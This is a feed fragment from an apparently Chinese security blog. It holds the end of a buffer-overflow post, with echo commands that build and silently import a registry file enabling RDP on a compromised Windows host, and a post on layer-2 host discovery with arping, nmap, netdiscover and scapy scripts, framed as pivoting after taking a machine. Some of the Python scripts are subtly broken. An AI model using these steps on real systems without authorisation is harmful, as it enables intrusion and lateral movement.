![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21092299.jpg)</span><br><span class="line"></span><br><span class="line">  - 觉得命令行不舒服：改注册表，然后3389远程连接：</span><br><span class="line"></span><br><span class="line">    - ```tex</span><br><span class="line">      echo Windows Registry Editor Version 5.00&gt;3389.reg</span><br><span class="line">      echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg</span><br><span class="line">      echo &quot;fDenyTSConnections&quot;=dword:00000000&gt;&gt;3389.reg</span><br><span class="line">      C:\&gt;echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg</span><br><span class="line">      echo [HKEY_LOCAL_MACHINE\SYSTEM Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg</span><br><span class="line">      C:\&gt;echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line">      echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line">      C:\&gt;echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg</span><br><span class="line">      echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg</span><br><span class="line">      echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line">      regedit /s 3389.reg</span><br></pre></td></tr></table></figure><ul><li><p><code>rdesktop 192.168.111.137</code>  远程桌面连接。</p><p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-23/7906793.jpg" alt=""></p></li></ul></li></ul></li></ul></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;缓冲区是内存中的一个片段，我们使用程序；在程序中输入一些参数、变量，这些都会先放在缓冲区中，然后通过CPU的调用、处理，然后再由计算机反馈出来。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;程序的漏洞从哪里来：&quot;&gt;&lt;a href=&quot;#程序的
      
    
    </summary>
    
      <category term="fuzzy" scheme="https://www.lsowl.xyz/categories/fuzzy/"/>
    
    
      <category term="安全" scheme="https://www.lsowl.xyz/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="fuzzy" scheme="https://www.lsowl.xyz/tags/fuzzy/"/>
    
      <category term="缓冲区溢出" scheme="https://www.lsowl.xyz/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>主动信息收集</title>
    <link href="https://www.lsowl.xyz/2018/06/05/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E4%BA%8C%E5%B1%82%E5%8F%91%E7%8E%B0/"/>
    <id>https://www.lsowl.xyz/2018/06/05/主动信息收集—二层发现/</id>
    <published>2018-06-05T12:39:50.000Z</published>
    <updated>2018-06-14T14:50:30.216Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>被动收集的信息可能不是最新的信息，通过主动的手段去发现更精确的信息</p></blockquote><ul><li>直接与目标系统交互通信</li><li>无法避免留下访问的痕迹（如果目标系统有完善的系统日志）</li><li>使用受控的第三方电脑进行探测<ul><li>使用代理或已经被控制的主机</li><li>做好本封杀的准备</li><li>使用噪声迷惑目标，淹没真实的探测流量</li></ul></li><li>扫描<ul><li>发送不同的探测，根据返回结果判断目标状态（ip，端口，服务）</li></ul></li></ul><h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><ul><li>识别活着的主机<ul><li>潜在的被攻击目标</li></ul></li><li>输出一个ip地址列表</li><li>2，3，4层发现</li></ul><h4 id="发现——二层发现"><a href="#发现——二层发现" class="headerlink" title="发现——二层发现"></a>发现——二层发现</h4><ul><li>优点：扫描速度快，可靠</li><li>缺点：不可路由，只能发现本网段</li><li>ARP协议<ul><li>抓包</li></ul></li></ul><ol><li><p>arping:(二层中单个存活主机的探测)</p><ul><li><figure class="highlight plain"><figcaption><span>arping 192.168.0.1 -c 1```  -c是指定发送一个包以后看是否存在，否则会一直发包；如果不在一个网络里，发包的话是不存在的</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">   - ```sudo arping 192.168.0.1 -d``` -d是同一个ip拥有不同的Mac地址，就是说，如果结果显示有两个Mac地址声称自己是网关，那么你的网络就存在arp欺骗，然后根据路由器查arp表进行定位</span><br><span class="line">   - ```sudo arping 192.168.0.1 -c 1 | grep &quot;bytes from&quot; | cut -d&quot; &quot; -f 5 |cut -d &quot;(&quot; -f 2 | cut -d&quot;)&quot; -f 1``` 通过管道显示活着的主机</span><br><span class="line">   - 但是这样只能扫描一个ip，不能自动化的去扫描一个网段，所以用脚本去实现：扫描的时候可以指定网卡，这里用bash脚本来实现这个功能```sudo ./arping1.sh eth0 &gt; addr.txt``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/12275742.jpg)</span><br><span class="line">   - 第二个脚本：这个脚本的功能是去探测已知ip列表的主机是否存活的脚本，前提是要有一个ip列表的文件```sudo ./arping2.sh addr.txt``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/77751631.jpg)</span><br><span class="line">   - 如果要在扫描的时候直接将结果重定向到一个文本文件中，直接早bash脚本中添加即可</span><br><span class="line"></span><br><span class="line">2. 二层发现——nmap:</span><br><span class="line"></span><br><span class="line">   - ```nmap -sn 192.168.0.1/24```   扫描速度更快，显示的信息更多</span><br><span class="line"></span><br><span class="line">   - &gt; Nmap scan report for 192.168.0.1</span><br><span class="line">     &gt; Host is up (0.020s latency).</span><br><span class="line">     &gt; Nmap scan report for 192.168.0.101</span><br><span class="line">     &gt; Host is up (0.0011s latency).</span><br><span class="line">     &gt; Nmap scan report for 192.168.0.104</span><br><span class="line">     &gt; Host is up (0.084s latency).</span><br><span class="line">     &gt; Nmap scan report for 192.168.0.107</span><br><span class="line">     &gt; Host is up (0.00059s latency).</span><br><span class="line">     &gt; Nmap done: 256 IP addresses (4 hosts up) scanned in 5.65 seconds</span><br><span class="line"></span><br><span class="line">   - ```nmap -iL filename -sn``` 这个可以做和arping第二个脚本一样的工作</span><br><span class="line"></span><br><span class="line">     &gt; -sn 参数不做端口扫描，但它不仅仅发ARP记录，还会DNS做ptr反向域名解析的解析</span><br><span class="line"></span><br><span class="line">3. 二层发现———Netdiscover</span><br><span class="line"></span><br><span class="line">   - 专用与二层发现</span><br><span class="line">   - 可用于无线和交换网络环境</span><br><span class="line">   - 主动和被动扫描</span><br><span class="line">   - 主动</span><br><span class="line">     - netdiscover -i eth0 -r 192.168.0.1/24![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/71668956.jpg)</span><br><span class="line">     - netdiscover -l iplist.txt</span><br><span class="line">   - 被动</span><br><span class="line">     - netdiscover -p （开启混杂模式）只要在在网卡上有arp包数据，就可以侦听到：![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/18073354.jpg)</span><br><span class="line">     - 主动arp容易触发预警</span><br><span class="line"></span><br><span class="line">4. 二层发现———Scapy</span><br><span class="line"></span><br><span class="line">   - scapy</span><br><span class="line"></span><br><span class="line">     - 作为Python的库文件进行调用</span><br><span class="line">     - 也可以做单独的工具使用</span><br><span class="line">     - 抓包，分析，创建，修改，注入网络流量</span><br><span class="line"></span><br><span class="line">   - apt-get install python-gnuplot</span><br><span class="line"></span><br><span class="line">   - 输入scapy启动scapy启动，然后输入ARP()调用这个函数，```ARP().display()查询ARP函数的属性``` ，这样就可以定制（arp的报头结构，将函数的属性字段添加进去，这样就可以实现一个arp查询）![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/83165222.jpg)</span><br><span class="line"></span><br><span class="line">   - 直接利用scapy进行arp探测，实际上就是通过调用scapy自带的函数进行查询：</span><br><span class="line"></span><br><span class="line">     - 首先```sudo scapy``` 启动进行scapy命令行模式下</span><br><span class="line">     - 通过```ARP().display()``` 可以查看APR这个函数下的函数头，然后这只pdst这个要查询的目标```arp.pdst=&quot;192.168.0.1&quot;``` 这里的arp是设置的变量</span><br><span class="line">     - 通过```sr1(arp)``` 进行发包然后查看回显：这里也可以设置一个anwser变量带代替返回的数据包，然后调用display方法查看数据包的返回情况（有一个问题，如果查询的是一个不存在的ip，这样会一直发包，所以要加上timeout，加上一个verbose=1，显示详细的信息）![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/81052649.jpg)</span><br><span class="line">     - scapy是Python的库，所以也支持Python脚本来进行探测，可以调用这个库来写脚本进行arp扫描，前面用的是shell脚本```sudo ./arp_disc.py eth0```  用脚本的话要慢，首先这里设计的脚本不是多线程，其次还要判断超时的时间，当然为了准确性，scarp默认发两个数据包</span><br><span class="line"></span><br><span class="line">     &gt; ```python</span><br><span class="line">     &gt; #!/usr/bin/python</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; import logging</span><br><span class="line">     &gt; import subprocess</span><br><span class="line">     &gt; logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">     &gt; from scapy.all import *</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; if len(sys.argv) != 2:</span><br><span class="line">     &gt;     print &quot;Usage - ./arp_disc.py [interface]&quot;</span><br><span class="line">     &gt;     print &quot;Example - ./ar_disc.py eth0&quot;</span><br><span class="line">     &gt;     print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;</span><br><span class="line">     &gt;     sys.exit()</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; interface = str(sys.argv[1])</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; ip = subprocess.check_output(&quot;ifconfig&quot; + interface + &quot; | grep &apos;inet&apos; | cut -d&apos;.&apos; -f 1-3 | cut -d&quot; &quot; -f 10 | cut -d &apos;f&apos; -f 1 &quot;,shell = True).strip()</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; prefix = ip.split(&apos;.&apos;)[0] + &apos;.&apos; + ip.split(&apos;.&apos;)[1] + &apos;.&apos; +ip.split(&apos;.&apos;)[2] + &apos;.&apos;</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; for addr in range(1,254):</span><br><span class="line">     &gt;     answer = sr1(ARP(pdst=prefix+str(addr)),timeout = 1,verbose = 0)</span><br><span class="line">     &gt;     if answer == None:</span><br><span class="line">     &gt;         pass</span><br><span class="line">     &gt;     else:</span><br><span class="line">     &gt;         print prefix + str(addr)</span><br><span class="line">     &gt;</span><br></pre></td></tr></table></figure><blockquote><p>第二个脚本，这个脚本和arping的第二个脚本类似，都是可以调用已知的ip列表文件进行二层的发现：<figure class="highlight plain"><figcaption><span>./arp_disc.py ip_list.txt```  脚本代码如下：</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt; ```python</span><br><span class="line">&gt; #!/usr/bin/python</span><br><span class="line">&gt; #-*- coding:utf-8 -*-</span><br><span class="line">&gt; </span><br><span class="line">&gt; import logging</span><br><span class="line">&gt; import subprocess</span><br><span class="line">&gt; logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">&gt; from scapy.all import *</span><br><span class="line">&gt; </span><br><span class="line">&gt; if len(sys.argv) != 2:</span><br><span class="line">&gt; print &quot;Usage - ./arp_disc.py [filename]&quot;</span><br><span class="line">&gt; print &quot;Example - ./arp_disc.py ip_list.txt&quot;</span><br><span class="line">&gt; print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;</span><br><span class="line">&gt; sys.exit()</span><br><span class="line">&gt; </span><br><span class="line">&gt; filename = str(sys.argv[1])</span><br><span class="line">&gt; file = open(filename,&apos;r&apos;)    #打开文件列表</span><br><span class="line">&gt; </span><br><span class="line">&gt; for addr in file:</span><br><span class="line">&gt; answer = sr1(ARP(pdst=prefix+str(addr)),timeout = 0.1,verbose = 0) #verbose=0，不显示报错的具体信息</span><br><span class="line">&gt; if answer == None:</span><br><span class="line">&gt;     pass</span><br><span class="line">&gt; else:</span><br><span class="line">&gt;     print addr.strip()    #将报错信息打印出来</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p></blockquote></li></ul></li></ol><blockquote><p><strong>总结：二层的发现主要是在拿下一台主机以后以此机器作为跳板进而对整个内网进行发现，但是由于内网的网络环境未知，而且服务器上面不一定有nmap，所以我们要利用一切可以利用的工具：arping，nmap,netdiscover,scopy等工具，以及自己编写的脚本</strong></p></blockquote><p><em>针对上面的两个脚本再补充两个多线程的脚本，就当做py练手了</em></p><ol><li><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="comment">#!/usr/bin/python</span></span><br><span class="line">&gt; <span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">&gt; <span class="keyword">import</span> logging</span><br><span class="line">&gt; <span class="keyword">import</span> subprocess</span><br><span class="line">&gt; <span class="keyword">import</span> threading,time</span><br><span class="line">&gt;</span><br><span class="line">&gt; logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line">&gt; <span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Usage - ./arp_disc.py [interface]"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example - ./arp_disc.py eth0"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example will perform an ARP scan of the local subnet to which eth0 is assigned"</span></span><br><span class="line">&gt;     sys.exit()</span><br><span class="line">&gt;</span><br><span class="line">&gt; interface = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">&gt;</span><br><span class="line">&gt; ip = subprocess.check_output(</span><br><span class="line">&gt;     <span class="string">"ifconfig "</span> + interface + <span class="string">" | grep 'inet' | cut -d'.' -f 1-3 | cut -d' ' -f 10 | cut -d 'f' -f 1 "</span>,</span><br><span class="line">&gt;     shell = <span class="keyword">True</span>).strip()</span><br><span class="line">&gt; prefix = ip.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + ip.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + ip.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         threading.Thread.__init__(self)</span><br><span class="line">&gt;</span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         <span class="keyword">global</span> answer,lock,n</span><br><span class="line">&gt;         time.sleep(<span class="number">0.1</span>)</span><br><span class="line">&gt;         <span class="keyword">if</span> lock.acquire():</span><br><span class="line">&gt;             answer = sr1(ARP(pdst = prefix + str(n)),timeout = <span class="number">1</span>,verbose = <span class="number">0</span>)</span><br><span class="line">&gt;             <span class="keyword">if</span> answer == <span class="keyword">None</span>:</span><br><span class="line">&gt;                 <span class="keyword">pass</span></span><br><span class="line">&gt;             <span class="keyword">else</span>:</span><br><span class="line">&gt;                 <span class="keyword">print</span> prefix + str(n)</span><br><span class="line">&gt;             n += <span class="number">1</span></span><br><span class="line">&gt;             lock.release()</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">&gt;     n = <span class="number">1</span></span><br><span class="line">&gt;     ThreadList = []</span><br><span class="line">&gt;     lock = threading.Lock()</span><br><span class="line">&gt;     <span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">254</span>):</span><br><span class="line">&gt;         t = MyThread()</span><br><span class="line">&gt;         ThreadList.append(t)</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.start()</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.join()</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote></li><li><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="comment">#!/usr/bin/python</span></span><br><span class="line">&gt; <span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">&gt; <span class="keyword">import</span> logging</span><br><span class="line">&gt; <span class="keyword">import</span> subprocess</span><br><span class="line">&gt; <span class="keyword">import</span> threading,time</span><br><span class="line">&gt;</span><br><span class="line">&gt; logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line">&gt; <span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Usage - ./arp_disc.py [interface]"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example - ./arp_disc.py eth0"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example will perform an ARP scan of the local subnet to which eth0 is assigned"</span></span><br><span class="line">&gt;     sys.exit()</span><br><span class="line">&gt;</span><br><span class="line">&gt; interface = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">&gt;</span><br><span class="line">&gt; ip = subprocess.check_output(</span><br><span class="line">&gt;     <span class="string">"ifconfig "</span> + interface + <span class="string">" | grep 'inet' | cut -d'.' -f 1-3 | cut -d' ' -f 10 | cut -d 'f' -f 1 "</span>,</span><br><span class="line">&gt;     shell = <span class="keyword">True</span>).strip()</span><br><span class="line">&gt; prefix = ip.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + ip.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + ip.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         threading.Thread.__init__(self)</span><br><span class="line">&gt;</span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         <span class="keyword">global</span> answer,lock</span><br><span class="line">&gt;         time.sleep(<span class="number">0.1</span>)</span><br><span class="line">&gt;         <span class="keyword">if</span> lock.acquire():</span><br><span class="line">&gt;             <span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">254</span>):</span><br><span class="line">&gt;                 answer = sr1(ARP(pdst = prefix + str(addr)),timeout = <span class="number">1</span>,verbose = <span class="number">0</span>)</span><br><span class="line">&gt;                 <span class="keyword">if</span> answer == <span class="keyword">None</span>:</span><br><span class="line">&gt;                     <span class="keyword">pass</span></span><br><span class="line">&gt;                 <span class="keyword">else</span>:</span><br><span class="line">&gt;                     <span class="keyword">print</span> prefix + str(addr)</span><br><span class="line">&gt;             lock.release()</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">&gt;     ThreadList = []</span><br><span class="line">&gt;     lock = threading.Lock()</span><br><span class="line">&gt;     <span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">&gt;         t = MyThread()</span><br><span class="line">&gt;         ThreadList.append(t)</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.start()</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.join()</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote></li></ol><ol start="2"><li><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="comment">#!/usr/bin/python</span></span><br><span class="line">&gt; <span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">import</span> logging</span><br><span class="line">&gt; <span class="keyword">import</span> subprocess</span><br><span class="line">&gt; <span class="keyword">import</span> threading,time</span><br><span class="line">&gt;</span><br><span class="line">&gt; logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line">&gt; <span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Usage - ./arp_disc.py [filename]"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example - ./arp_disc.py ip_list.txt"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example will perform an ARP scan of the local subnet to which eth0 is assigned"</span></span><br><span class="line">&gt;     sys.exit()</span><br><span class="line">&gt;</span><br><span class="line">&gt; filename = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">&gt; file = open(filename,<span class="string">'r'</span>)  <span class="comment"># 打开文件列表</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">Mythread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         threading.Thread.__init__(self)</span><br><span class="line">&gt;</span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         <span class="keyword">global</span> lock</span><br><span class="line">&gt;         time.sleep(<span class="number">1</span>)</span><br><span class="line">&gt;         <span class="keyword">if</span> lock.acquire():</span><br><span class="line">&gt;             <span class="keyword">for</span> addr <span class="keyword">in</span> file:</span><br><span class="line">&gt;                 answer = sr1(ARP(pdst = addr.strip()),timeout = <span class="number">0.1</span>,</span><br><span class="line">&gt;                              verbose = <span class="number">0</span>)  <span class="comment"># verbose=0，不显示报错的具体信息,这里循环打开的是文件中的每一行IP地址</span></span><br><span class="line">&gt;                 <span class="keyword">if</span> answer == <span class="keyword">None</span>:</span><br><span class="line">&gt;                     <span class="keyword">pass</span></span><br><span class="line">&gt;                 <span class="keyword">else</span>:</span><br><span class="line">&gt;                     <span class="keyword">print</span> addr.strip()  <span class="comment"># 将报错信息打印出来</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">&gt;     ThreadList = []</span><br><span class="line">&gt;     lock = threading.Lock()</span><br><span class="line">&gt;     <span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">&gt;         t = MyThread()</span><br><span class="line">&gt;         ThreadList.append(t)</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.start</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.join</span><br><span class="line">&gt;</span><br><span 